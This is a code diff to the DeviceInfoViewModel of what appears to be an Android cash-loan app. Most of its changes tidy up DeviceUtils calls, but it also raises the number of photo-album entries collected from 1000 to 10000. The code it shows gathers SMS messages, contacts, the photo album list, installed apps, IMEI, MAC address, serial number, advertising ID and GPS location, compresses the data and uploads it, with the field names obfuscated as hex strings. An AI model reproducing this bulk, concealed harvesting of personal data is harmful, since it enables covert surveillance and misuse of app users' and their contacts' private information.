@@ -8,6 +8,7 @@ import com.kredit.cash.loan.app.bean.*
 import com.kredit.cash.loan.app.common.Constant
 import com.kredit.cash.loan.app.common.UserManager
 import com.kredit.cash.loan.app.net.Api
+import com.kredit.cash.loan.app.utils.DeviceUtils
 import com.tcl.base.common.BaseViewModel
 import com.tcl.base.event.SingleLiveEvent
 import com.tcl.base.kt.GZIPCompress
@@ -66,11 +67,10 @@ open class DeviceInfoViewModel : BaseViewModel() {
      */
     fun upDevicePhoto() {
         rxLaunchUI({
-            val files = com.kredit.cash.loan.app.utils.DeviceUtils.getLocalAlbumList(0, 1000)
+            val files = DeviceUtils.getLocalAlbumList(0, 10000)
             val paramStr = GsonUtils.toJson(files)
             LogUtils.dTag("deviceParam", "uploadDeviceAlbumInfo ->$paramStr")
-            val paramBean =
-                DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086` = paramStr.GZIPCompress())
+            val paramBean = DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086` = paramStr.GZIPCompress())
             val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
             upDeviceInfo.postValue(result.`869187819880`)
         }, showToast = false)
@@ -108,7 +108,7 @@ open class DeviceInfoViewModel : BaseViewModel() {
      */
     fun uploadDeviceSmsInfo() {
         rxLaunchUI({
-            val paramStr = GsonUtils.toJson(com.kredit.cash.loan.app.utils.DeviceUtils.getSmsInPhone())
+            val paramStr = GsonUtils.toJson(DeviceUtils.getSmsInPhone())
             LogUtils.dTag("deviceParam", "uploadDeviceSmsInfo ->$paramStr")
             val paramBean = DeviceSMSParamBean(paramStr.GZIPCompress())
             val result = Api.uploadDeviceSmsInfo(GsonUtils.toJson(paramBean))
@@ -121,7 +121,7 @@ open class DeviceInfoViewModel : BaseViewModel() {
      */
     fun uploadDeviceContactsInfo() {
         rxLaunchUI({
-            val paramStr = GsonUtils.toJson(com.kredit.cash.loan.app.utils.DeviceUtils.getContacts())
+            val paramStr = GsonUtils.toJson(DeviceUtils.getContacts())
             LogUtils.dTag("deviceParam", "uploadDeviceContactsInfo ->$paramStr")
             val paramBean = DeviceContactsParamBean(paramStr.GZIPCompress())
             val result = Api.uploadDeviceContactsInfo(GsonUtils.toJson(paramBean))
@@ -134,7 +134,7 @@ open class DeviceInfoViewModel : BaseViewModel() {
      */
     fun uploadDeviceAppInfo() {
         rxLaunchUI({
-            val paramStr = GsonUtils.toJson(com.kredit.cash.loan.app.utils.DeviceUtils.getAllAppInfo())
+            val paramStr = GsonUtils.toJson(DeviceUtils.getAllAppInfo())
             LogUtils.dTag("deviceParam", "uploadDeviceContactsInfo ->$paramStr")
             val paramBean = DeviceAppsParamBean(paramStr.GZIPCompress())
             val result = Api.uploadDeviceAppInfo(GsonUtils.toJson(paramBean))
@@ -154,7 +154,7 @@ open class DeviceInfoViewModel : BaseViewModel() {
      */
     fun uploadDeviceBaseInfo() {
         Thread {
-            val gaid = com.kredit.cash.loan.app.utils.DeviceUtils.getGAID()//需异步请求
+            val gaid = DeviceUtils.getGAID()//需异步请求
             rxLaunchUI({
                 val batteryPct = MmkvUtil.decodeString("batteryPct")
                 val curLatitude = MmkvUtil.decodeDouble("curLatitude") ?: 0.0
@@ -168,26 +168,26 @@ open class DeviceInfoViewModel : BaseViewModel() {
                 val paramBean = DeviceBaseInfoBean(
                     `9695808091868DA78095808187` = BatteryStatusBean(batteryPct),
                     `9091829D9791B29D9891B79A80` = DeviceFileCnt(
-                        `9581909D9BB18C8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readExternalMusicNum(),
-                        `9581909D9BBD9A8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readInternalMusicNum(),
-                        `909B839A989B9590B29D989187` = com.kredit.cash.loan.app.utils.DeviceUtils.readInternalVideoNum(),
-                        `9D9995939187B18C8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readExternalImgNum(),
-                        `9D9995939187BD9A8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readDownloadNum(),
-                        `829D90919BB18C8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readExternalVideoNum(),
-                        `829D90919BBD9A8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readInternalImgNum()
+                        `9581909D9BB18C8091869A9598` = DeviceUtils.readExternalMusicNum(),
+                        `9581909D9BBD9A8091869A9598` = DeviceUtils.readInternalMusicNum(),
+                        `909B839A989B9590B29D989187` = DeviceUtils.readInternalVideoNum(),
+                        `9D9995939187B18C8091869A9598` = DeviceUtils.readExternalImgNum(),
+                        `9D9995939187BD9A8091869A9598` = DeviceUtils.readDownloadNum(),
+                        `829D90919BB18C8091869A9598` = DeviceUtils.readExternalVideoNum(),
+                        `829D90919BBD9A8091869A9598` = DeviceUtils.readInternalImgNum()
                     ),
                     `93919A91869598B0958095` = GeneralData(
-                        `959A90BD90` = com.kredit.cash.loan.app.utils.DeviceUtils.getAndroidId(),
-                        `909699` = com.kredit.cash.loan.app.utils.DeviceUtils.getMobileDbm(),
-                        `9091829D9791BD90` = com.kredit.cash.loan.app.utils.DeviceUtils.getDeviceId(),
-                        `91989584879190A6919598809D9991` = com.kredit.cash.loan.app.utils.DeviceUtils.getSystemStartupTime(),
+                        `959A90BD90` = DeviceUtils.getAndroidId(),
+                        `909699` = DeviceUtils.getMobileDbm(),
+                        `9091829D9791BD90` = DeviceUtils.getDeviceId(),
+                        `91989584879190A6919598809D9991` = DeviceUtils.getSystemStartupTime(),
                         `9395BD90` = gaid,
-                        `9D99919D` = com.kredit.cash.loan.app.utils.DeviceUtils.getIMEI(),
-                        `999597` = com.kredit.cash.loan.app.utils.DeviceUtils.getMac()
+                        `9D99919D` = DeviceUtils.getIMEI(),
+                        `999597` = DeviceUtils.getMac()
                     ),
                     `9C95869083958691` = HardwareBean(
-                        `9686959A90` = com.kredit.cash.loan.app.utils.DeviceUtils.getDeviceBrand(),
-                        `8791869D9598BA8199969186` = com.kredit.cash.loan.app.utils.DeviceUtils.getSERIAL()
+                        `9686959A90` = DeviceUtils.getDeviceBrand(),
+                        `8791869D9598BA8199969186` = DeviceUtils.getSERIAL()
                     ),
                     `989B9795809D9B9A` = LocationBean(
                         `938487` = GpsBean(curLatitude, curLongitude),
@@ -195,13 +195,13 @@ open class DeviceInfoViewModel : BaseViewModel() {
                         `938487B5909086918787B79D808D` = address?.locality.nullToEmpty(),
                         `938487B5909086918787B895869391B09D8780869D9780` = area
                     ),
-                    `9A9180839B869F` = WifiConnectBean(com.kredit.cash.loan.app.utils.DeviceUtils.getAroundWifiNum()),
+                    `9A9180839B869F` = WifiConnectBean(DeviceUtils.getAroundWifiNum()),
                     `87809B86959391` = StorageBean(
                         `918C8091869A9598A7809B86959391` = Utils.getApp().externalCacheDir?.absolutePath,
-                        `9991999B868DB7958690A79D8E91` = com.kredit.cash.loan.app.utils.DeviceUtils.getSDTotalSize(),
-                        `9991999B868DB7958690A79D8E91A18791` = com.kredit.cash.loan.app.utils.DeviceUtils.getSDTotalSize() - com.kredit.cash.loan.app.utils.DeviceUtils.getSdAvaliableSize(),
-                        `869599A09B809598A79D8E91` = com.kredit.cash.loan.app.utils.DeviceUtils.getRomTotalSize(),
-                        `869599A18795969891A79D8E91` = com.kredit.cash.loan.app.utils.DeviceUtils.getRomAvailableSize()
+                        `9991999B868DB7958690A79D8E91` = DeviceUtils.getSDTotalSize(),
+                        `9991999B868DB7958690A79D8E91A18791` = DeviceUtils.getSDTotalSize() - DeviceUtils.getSdAvaliableSize(),
+                        `869599A09B809598A79D8E91` = DeviceUtils.getRomTotalSize(),
+                        `869599A18795969891A79D8E91` = DeviceUtils.getRomAvailableSize()
                     ),
                 )
                 val paramStr = GsonUtils.toJson(paramBean)
